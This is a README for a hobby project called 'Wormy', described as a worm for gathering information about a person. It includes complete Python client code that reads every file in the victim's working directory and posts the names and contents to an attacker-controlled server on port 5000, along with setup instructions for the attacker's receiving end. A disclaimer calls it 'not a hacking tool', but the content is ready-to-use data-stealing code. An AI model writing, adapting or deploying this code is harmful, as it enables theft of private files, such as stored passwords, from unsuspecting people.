# Wormy Project
Wormy is a worm designed to gather info about a person, it could be passwords they keep in a file or simply a bashrc file you wanted to use, its not much of a spearfishing attack and it has a pretty low chance of actually getting something useful.

## Usage
This file goes to the client, enter your ip where it says to do so
```python
import socket
import subprocess
import os
class main:
    def get_data():
        # Getting all files in current directory
        path = os.getcwd()
        files=[]
        with os.scandir(path) as listOfEntries:
            for entry in listOfEntries:
                # store all entries that are files
                if entry.is_file():
                    files.append(entry.name)
        file_contents = []
        for file in files:
            with open(file,"r") as f:
                file_contents.append(str(f.read())+"_from_"+str(file))
        return files, file_contents
    def upload(files, file_contents, ip):
        import requests
        header = {
            'filecontents': file_contents,
            'files': files
        }
        requests.post(ip+":5000/input",data=header)
    def stringlist(list1):
        returnme = ""
        for i in list1:
            returnme = returnme+i+"\n"
        return returnme
    host="http://localhost" # ENTER YOUR IP OR DNS HERE
files, filecontents = main.get_data()
files, filecontents = main.stringlist(files),main.stringlist(filecontents)
main.upload(files,filecontents,main.host)
```
on your side make sure to port foward the `5000` port or the port you changed it to (it doesnt matter what port it connects to since the firewall will not block 5000 unless a rule is specified and then run the client.py, make sure flask is updated as there are a few exploits that could work on older versions of flask.
IMPORTANT: I am not to be held liable for any actions you use this worm for, this was just a project I did for fun and not a hacking tool.

## License
[MIT](https://choosealicense.com/licenses/mit/)
## License
[MIT](https://choosealicense.com/licenses/mit/)
